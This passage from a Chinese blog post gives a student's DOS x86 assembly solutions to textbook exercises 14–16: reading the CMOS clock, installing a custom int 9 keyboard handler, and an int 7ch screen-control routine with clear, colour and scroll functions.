class="hljs-symbol"></span><br><span class="hljs-symbol">   a:</span>   <span class="hljs-keyword">jmp</span> short astart<br>   <span class="hljs-built_in">db</span> <span class="hljs-string">&quot;9/8/7 4:2:0&quot;</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">astart:</span> <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-built_in">cs</span><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ds</span>,<span class="hljs-built_in">ax</span><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">si</span>,<span class="hljs-number">202h</span>     <span class="hljs-comment">;ds:si指向数据段</span><br><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">0b800h</span><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">es</span>,<span class="hljs-built_in">ax</span><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">160</span>*<span class="hljs-number">12</span>+<span class="hljs-number">30</span>*<span class="hljs-number">2</span><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">di</span>,<span class="hljs-number">0</span>              <span class="hljs-comment">;es:di指向显示缓冲区</span><br><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">cx</span>,<span class="hljs-number">11</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">   s:</span>   <span class="hljs-keyword">push</span> <span class="hljs-built_in">cx</span><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">cl</span>,<span class="hljs-built_in">ds</span>:[<span class="hljs-built_in">si</span>]<br>        <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">cl</span>,<span class="hljs-number">48</span><br>    <span class="hljs-keyword">jb</span> no      <br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">cl</span>,<span class="hljs-number">57</span><br>    <span class="hljs-keyword">ja</span> no  <span class="hljs-comment">;ASCII码值小于48或大于57则转移至no,即不是数字就直接显示</span><br><br>    <span class="hljs-keyword">call</span> yes          <span class="hljs-comment">;是数字就转移到yes处执行</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">cx</span><br>    <span class="hljs-keyword">loop</span> s<br><br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">4c00h</span><br>  <span class="hljs-keyword">int</span> <span class="hljs-number">21h</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">   no:</span>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">es</span>:[<span class="hljs-built_in">bx</span>+<span class="hljs-built_in">di</span>],<span class="hljs-built_in">cl</span><br>    <span class="hljs-keyword">add</span> <span class="hljs-built_in">di</span>,<span class="hljs-number">2</span><br>        <span class="hljs-keyword">inc</span> <span class="hljs-built_in">si</span><br><br>        <span class="hljs-keyword">pop</span> <span class="hljs-built_in">cx</span><br>        <span class="hljs-keyword">sub</span> <span class="hljs-built_in">cx</span>,<span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">jmp</span> <span class="hljs-built_in">far</span> <span class="hljs-built_in">ptr</span> s    <span class="hljs-comment">;段间转移至s处</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">   yes:</span> <span class="hljs-keyword">sub</span> <span class="hljs-built_in">cl</span>,<span class="hljs-number">48</span> <span class="hljs-comment">;字符转换为整数</span><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,<span class="hljs-built_in">cl</span><br>        <span class="hljs-keyword">out</span> <span class="hljs-number">70h</span>,<span class="hljs-built_in">al</span><br>        <span class="hljs-keyword">in</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">71h</span><br><br>        <span class="hljs-keyword">mov</span> <span class="hljs-number">ah</span>,<span class="hljs-built_in">al</span><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">cl</span>,<span class="hljs-number">4</span><br>        <span class="hljs-keyword">shr</span> <span class="hljs-number">ah</span>,<span class="hljs-built_in">cl</span><br>        <span class="hljs-keyword">and</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">00001111b</span><br><br>        <span class="hljs-keyword">add</span> <span class="hljs-number">ah</span>,<span class="hljs-number">30h</span><br>        <span class="hljs-keyword">add</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">30h</span><br><br>        <br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">es</span>:[<span class="hljs-built_in">bx</span>+<span class="hljs-built_in">di</span>],<span class="hljs-number">ah</span>     <br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">es</span>:[<span class="hljs-built_in">bx</span>+<span class="hljs-built_in">di</span>+<span class="hljs-number">2</span>],<span class="hljs-built_in">al</span>     <br>        <span class="hljs-keyword">add</span> <span class="hljs-built_in">di</span>,<span class="hljs-number">4</span><br>        <span class="hljs-keyword">inc</span> <span class="hljs-built_in">si</span><br><br>        <span class="hljs-keyword">ret</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">      aend:</span> <span class="hljs-keyword">nop</span><br><br>code ends<br>end start<br><br><br>测试程序：<br><span class="hljs-meta">assume</span> <span class="hljs-built_in">cs</span>:code<br>code <span class="hljs-meta">segment</span><br><span class="hljs-symbol">start:</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">7ch</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">4c00h</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">21h</span><br>code ends<br>end start<br><br><span class="hljs-comment">;问题：刚开始没注意到 db 中，即数据段中的数字是 ascii 码。</span><br><span class="hljs-comment">;解决办法：sub cl,48 ;将字符转换为整数</span><br><br></code></pre></td></tr></table></figure><hr /><h2 id="实验15-安装新的-int9-中断例程">实验15 安装新的 int9中断例程</h2><hr /><p>安装一个新的 int 9 中断例程，功能：在 DOS下，按下“A”键后，如果松开，则显示满屏幕的“A”（字符显示属性为蓝底高亮红色），其他键照常处理。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><br><span class="hljs-comment">;(有点8懂)</span><br><br><span class="hljs-meta">assume</span> <span class="hljs-built_in">cs</span>:code<br><br>stack <span class="hljs-meta">segment</span><br>  <span class="hljs-built_in">db</span> <span class="hljs-number">128</span> dup (<span class="hljs-number">0</span>)<br>stack ends<br><br>code <span class="hljs-meta">segment</span><br><span class="hljs-symbol">start:</span>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,stack<br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ss</span>,<span class="hljs-built_in">ax</span><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">sp</span>,<span class="hljs-number">128</span><br><br>        <span class="hljs-keyword">push</span> <span class="hljs-built_in">cs</span><br>        <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ds</span><br><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">0</span><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">es</span>,<span class="hljs-built_in">ax</span><br><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">si</span>,offset int9<br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">di</span>,<span class="hljs-number">204h</span><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">cx</span>,offset int9end-offset int9     <span class="hljs-comment">;cx为传输长度</span><br>        <span class="hljs-keyword">cld</span>                                   <span class="hljs-comment">;设置传输方向为正</span><br>        <span class="hljs-keyword">rep</span> <span class="hljs-keyword">movsb</span><br><br>        <span class="hljs-keyword">push</span> <span class="hljs-built_in">es</span>:[<span class="hljs-number">9</span>*<span class="hljs-number">4</span>]<br>        <span class="hljs-keyword">pop</span> <span class="hljs-built_in">es</span>:[<span class="hljs-number">200h</span>]<br>        <span class="hljs-keyword">push</span> <span class="hljs-built_in">es</span>:[<span class="hljs-number">9</span>*<span class="hljs-number">4</span>+<span class="hljs-number">2</span>]<br>        <span class="hljs-keyword">pop</span> <span class="hljs-built_in">es</span>:[<span class="hljs-number">202h</span>]             <span class="hljs-comment">;将原int 9中断例程的入口地址保存在0:200单元处</span><br><br>        <span class="hljs-keyword">cli</span>                            <span class="hljs-comment">;设置IF=0，不响应可屏蔽中断</span><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">word</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">es</span>:[<span class="hljs-number">9</span>*<span class="hljs-number">4</span>],<span class="hljs-number">204h</span><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">word</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">es</span>:[<span class="hljs-number">9</span>*<span class="hljs-number">4</span>+<span class="hljs-number">2</span>],<span class="hljs-number">0</span>      <span class="hljs-comment">;将新的int 9中断例程安装在0:204处</span><br>        <span class="hljs-keyword">sti</span>                            <span class="hljs-comment">;设置IF=1，响应可屏蔽中断</span><br><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">4c00h</span><br>        <span class="hljs-keyword">int</span> <span class="hljs-number">21h</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">int9:</span>   <span class="hljs-keyword">push</span> <span class="hljs-built_in">ax</span><br>        <span class="hljs-keyword">push</span> <span class="hljs-built_in">bx</span><br>        <span class="hljs-keyword">push</span> <span class="hljs-built_in">cx</span><br>        <span class="hljs-keyword">push</span> <span class="hljs-built_in">es</span><br><br>        <span class="hljs-keyword">in</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">60h</span>                     <span class="hljs-comment">;从端口60h读出键盘的输入</span><br><br>        <span class="hljs-keyword">pushf</span><br>        <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">cs</span>:[<span class="hljs-number">200h</span>]      <span class="hljs-comment">;调用BIOS的int 9中断例程</span><br><br>        <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">9eh</span><br>        <span class="hljs-keyword">jne</span> int9ret<br>    <br>        <span class="hljs-keyword">mov</span> <span class="hljs-number">ah</span>,<span class="hljs-string">&#x27;A&#x27;</span><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">1ch</span><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">0b800h</span><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">es</span>,<span class="hljs-built_in">bx</span><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">0</span><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">cx</span>,<span class="hljs-number">2000</span><br><span class="hljs-symbol">    s:</span>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">es</span>:[<span class="hljs-built_in">bx</span>],<span class="hljs-number">ah</span> <br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">es</span>:[<span class="hljs-built_in">bx</span>+<span class="hljs-number">1</span>],<span class="hljs-built_in">al</span><br>        <span class="hljs-keyword">add</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">2</span><br>        <span class="hljs-keyword">loop</span> s<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">int9ret:</span><span class="hljs-keyword">pop</span> <span class="hljs-built_in">es</span><br>        <span class="hljs-keyword">pop</span> <span class="hljs-built_in">cx</span><br>        <span class="hljs-keyword">pop</span> <span class="hljs-built_in">bx</span><br>        <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ax</span><br>        <span class="hljs-keyword">iret</span>  <span class="hljs-comment">;前面没call就险先写iret</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">int9end:</span><span class="hljs-keyword">nop</span><br><br>code ends<br>end start<br><br></code></pre></td></tr></table></figure><hr /><h2 id="实验16-编写包含多个功能子程序的中断例程">实验16编写包含多个功能子程序的中断例程</h2><hr /><ul><li>安装一个新的 int 7ch 中断例程，为显示输出提供如下功能子程序。<ul><li>（1）清屏；</li><li>（2）设置前景色；</li><li>（3）设置背景色；</li><li>（4）向上滚动一行。</li></ul></li><li>入口参数说明如下：<ul><li>（1） 用 ah 寄存器传递功能号：0 表示清屏；1 表示设置前景色；2表示设置背景色；3 表示向上滚动一行；</li><li>（2） 对于 1、2 号功能，用 al 传递颜色值，(al)∈{0,1,2,3,4,5,6,7}。</li></ul></li></ul><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><br><span class="hljs-meta">assume</span> <span class="hljs-built_in">cs</span>:code<br><br>code <span class="hljs-meta">segment</span><br><span class="hljs-symbol">start:</span>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-built_in">cs</span><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ds</span>,<span class="hljs-built_in">ax</span><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">si</span>,offset int7c           <span class="hljs-comment">;设置ds:si指向源地址</span><br><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">0</span><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">es</span>,<span class="hljs-built_in">ax</span><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">di</span>,<span class="hljs-number">200h</span>               <span class="hljs-comment">;设置es:di指向目的地址</span><br><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">cx</span>,offset int7cend-offset int7c            <span class="hljs-comment">;cx为传输长度</span><br>        <span class="hljs-keyword">cld</span>                                            <span class="hljs-comment">;传输方向为正</span><br>        <span class="hljs-keyword">rep</span> <span class="hljs-keyword">movsb</span>                                      <span class="hljs-comment">;用movsb指令，将a的代码送入0:200处</span><br>    <br>        <span class="hljs-keyword">cli</span><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">0</span><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">es</span>,<span class="hljs-built_in">ax</span><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">word</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">es</span>:[<span class="hljs-number">07ch</span>*<span class="hljs-number">4</span>],<span class="hljs-number">200h</span><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">word</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">es</span>:[<span class="hljs-number">07ch</span>*<span class="hljs-number">4</span>+<span class="hljs-number">2</span>],<span class="hljs-number">0</span>    <span class="hljs-comment">;设置中断向量</span><br>        <span class="hljs-keyword">sti</span><br><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">4c00h</span><br>        <span class="hljs-keyword">int</span> <span class="hljs-number">21h</span><br><span class="hljs-symbol">        </span><br><span class="hljs-symbol">int7c:</span>  <span class="hljs-keyword">jmp</span> short setscreen<br><br><span class="hljs-comment">; 这里要注意，在安装程序中的sub1是一串数据，在中断例程安装在0:200h中时 如果仍然按照第十六章那样设置，是无法成功调用子程序的，</span><br><span class="hljs-comment">; 因为主程序运行完毕以后,主程序所占的内存可能会被其他内容覆盖，所以我们要把子程序安装在中断例程之后的内存中</span><br><span class="hljs-comment">; 当然这样会存在一个问题，如果中断例程并没有安装在0:200处，则table中的值也要相应改动</span><br><span class="hljs-comment">; 至于为什么子程序中的sub1s,sub2s以及loop指令还能正常工作，是因为这是基于位移的跳转</span><br><span class="hljs-comment">; 即在主程序中，相应的loop/jmp指令已经编译为回退/前进xx字节的指令，因此不会受位置移动的影响</span><br><br>  table<span class="hljs-built_in">dw</span> sub1-int7c+<span class="hljs-number">200h</span>,sub2-int7c+<span class="hljs-number">200h</span>,sub3-int7c+<span class="hljs-number">200h</span>,sub4-int7c+<span class="hljs-number">200h</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol"> setscreen:</span><span class="hljs-keyword">push</span> <span class="hljs-built_in">bx</span><br>  <br>  <span class="hljs-keyword">cmp</span> <span class="hljs-number">ah</span>,<span class="hljs-number">3</span><span class="hljs-comment">; 判断功能号是否大于3</span><br>  <span class="hljs-keyword">ja</span> sret<br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">bl</span>,<span class="hljs-number">ah</span><br>  <span class="hljs-keyword">mov</span> <span class="hljs-number">bh</span>,<span class="hljs-number">0</span><br>  <span class="hljs-keyword">add</span> <span class="hljs-built_in">bx</span>,<span class="hljs-built_in">bx</span><span class="hljs-comment">; 根据ah提供的功能号找到对应子程序在table中的偏移</span><br>  <br>  <span class="hljs-keyword">push</span> <span class="hljs-built_in">cs</span><br>  <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ds</span><br>  <span class="hljs-keyword">call</span> <span class="hljs-built_in">word</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">bx</span>+<span class="hljs-number">200h</span>+<span class="hljs-number">2</span>]<span class="hljs-comment">; 调用</span><br><span class="hljs-symbol">  </span><br><span class="hljs-symbol">  sret:</span>   <span class="hljs-keyword">pop</span> <span class="hljs-built_in">bx</span><br>  <span class="hljs-keyword">iret</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">    sub1:</span>   <span class="hljs-keyword">push</span> <span class="hljs-built_in">bx</span>                 <span class="hljs-comment">;1号子程序,清屏</span><br>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">cx</span><br>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">es</span><br>            <span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">0b800h</span><br>            <span class="hljs-keyword">mov</span> <span class="hljs-built_in">es</span>,<span class="hljs-built_in">bx</span><br>            <span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">0</span><br>            <span class="hljs-keyword">mov</span> <span class="hljs-built_in">cx</span>,<span class="hljs-number">2000</span><br><span class="hljs-symbol">    sub1s:</span>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">es</span>:[<span class="hljs-built_in">bx</span>],<span class="hljs-string">&#x27; &#x27;</span><br>            <span class="hljs-keyword">add</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">2</span><br>            <span class="hljs-keyword">loop</span> sub1s<br>            <span class="hljs-keyword">pop</span> <span class="hljs-built_in">es</span><br>            <span class="hljs-keyword">pop</span> <span class="hljs-built_in">cx</span><br>            <span class="hljs-keyword">pop</span> <span class="hljs-built_in">bx</span><br>            <span class="hljs-keyword">ret</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">    sub2:</span><span class="hljs-keyword">push</span> <span class="hljs-built_in">bx</span>              <span class="hljs-comment">;2号子程序,设置前景色</span><br>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">cx</span><br>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">es</span><br>            <span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">0b800h</span><br>            <span class="hljs-keyword">mov</span> <span class="hljs-built_in">es</span>,<span class="hljs-built_in">bx</span><br>            <span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">1</span><br>            <span class="hljs-keyword">mov</span> <span class="hljs-built_in">cx</span>,<span class="hljs-number">2000</span><br><span class="hljs-symbol">    sub2s:</span>  <span class="hljs-keyword">and</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">es</span>:[<span class="hljs-built_in">bx</span>],<span class="hljs-number">11111000b</span><br>            <span class="hljs-keyword">or</span> <span class="hljs-built_in">es</span>:[<span class="hljs-built_in">bx</span>],<span class="hljs-built_in">al</span><br>            <span class="hljs-keyword">add</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">2</span><br>            <span class="hljs-keyword">loop</span> sub2s<br>            <span class="hljs-keyword">pop</span> <span class="hljs-built_in">es</span><br>            <span class="hljs-keyword">pop</span> <span class="hljs-built_in">cx</span><br>            <span class="hljs-keyword">pop</span> <span class="hljs-built_in">bx</span><br>            <span class="hljs-keyword">ret</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">    sub3:</span>   <span class="hljs-keyword">push</span> <span class="hljs-built_in">bx</span>                <span class="hljs-comment">;3号子程序,设置背景色</span><br>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">cx</span><br>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">es</span><br>            <span class="hljs-keyword">mov</span> <span class="hljs-built_in">cl</span>,<span class="hljs-number">4</span><br>            <span class="hljs-keyword">shl</span> <span class="hljs-built_in">al</span>,<span class="hljs-built_in">cl</span><br>            <span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">0b800h</span><br>            <span class="hljs-keyword">mov</span> <span class="hljs-built_in">es</span>,<span class="hljs-built_in">bx</span><br>            <span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">1</span><br>            <span class="hljs-keyword">mov</span> <span class="hljs-built_in">cx</span>,<span class="hljs-number">2000</span><br><span class="hljs-symbol">    sub3s:</span>  <span class="hljs-keyword">and</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">es</span>:[<span class="hljs-built_in">bx</span>],<span class="hljs-number">10001111b</span><br>            <span class="hljs-keyword">or</span> <span class="hljs-built_in">es</span>:[<span class="hljs-built_in">bx</span>],<span class="hljs-built_in">al</span><br>            <span class="hljs-keyword">add</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">2</span><br>            <span class="hljs-keyword">loop</span> sub3s<br>            <span class="hljs-keyword">pop</span> <span class="hljs-built_in">es</span><br>            <span class="hljs-keyword">pop</span> <span class="hljs-built_in">cx</span><br>            <span class="hljs-keyword">pop</span> <span class="hljs-built_in">bx</span><br>            <span class="hljs-keyword">ret</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">    sub4:</span>   <span class="hljs-keyword">push</span> <span class="hljs-built_in">cx</span>            <span class="hljs-comment">;4号子程序,向上滚动一行</span><br>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">si</span><br>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">di</span><br>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">es</span><br>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ds</span><br><br>            <span class="hljs-keyword">mov</span> <span class="hljs-built_in">si</span>,<span class="hljs-number">0b800h</span><br>            <span class="hljs-keyword">mov</span> <span class="hljs-built_in">es</span>,<span class="hljs-built_in">si</span><br>            <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ds</span>,<span class="hljs-built_in">si</span><br>            <span class="hljs-keyword">mov</span> <span class="hljs-built_in">si</span>,<span class="hljs-number">160</span><br>            <span class="hljs-keyword">mov</span> <span class="hljs-built_in">di</span>,<span class="hljs-number">0</span><br>            <span class="hljs-keyword">cld</span><br>            <span class="hljs-keyword">mov</span> <span class="hljs-built_in">cx</span>,<span class="hljs-number">24</span><br><span class="hljs-symbol">    sub4s:</span>  <span class="hljs-keyword">push</span> <span class="hljs-built_in">cx</span><br>            <span class="hljs-keyword">mov</span> <span class="hljs-built_in">cx</span>,<span class="hljs-number">160</span><br>            <span class="hljs-keyword">rep</span> <span class="hljs-keyword">movsb</span><br>            <span class="hljs-keyword">pop</span> <span class="hljs-built_in">cx</span><br>            <span class="hljs-keyword">loop</span> sub4s<br><br>            <span class="hljs-keyword">mov</span> <span class="hljs-built_in">cx</span>,<span class="hljs-number">80</span><br>            <span class="hljs-keyword">mov</span> <span class="hljs-built_in">si</span>,<span class="hljs-number">0</span><br><span class="hljs-symbol">    sub4s1:</span> <span class="hljs-keyword">mov</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-number">160</span>*<span class="hljs-number">24</span>+<span class="hljs-built_in">si</span>],<span class="hljs-string">&#x27; &#x27;</span><br>            <span class="hljs-keyword">add</span> <span class="hljs-built_in">si</span>,<span class="hljs-number">2</span><br>            <span class="hljs-keyword">loop</span> sub4s1<br>            <br>            <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ds</span><br>            <span class="hljs-keyword">pop</span> <span class="hljs-built_in">es</span><br>            <span class="hljs-keyword">pop</span> <span class="hljs-built_in">di</span><br>            <span class="hljs-keyword">pop</span> <span class="hljs-built_in">si</span><br>            <span class="hljs-keyword">pop</span> <span class="hljs-built_in">cx</span><br>            <span class="hljs-keyword">ret</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">int7cend:</span>  <span class="hljs-keyword">nop</span><br><br>code ends<br>end start<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>汇编</category>
      
    </categories>
    
    
    <tags>
      
      <tag>汇编</tag>
      
    </tags>
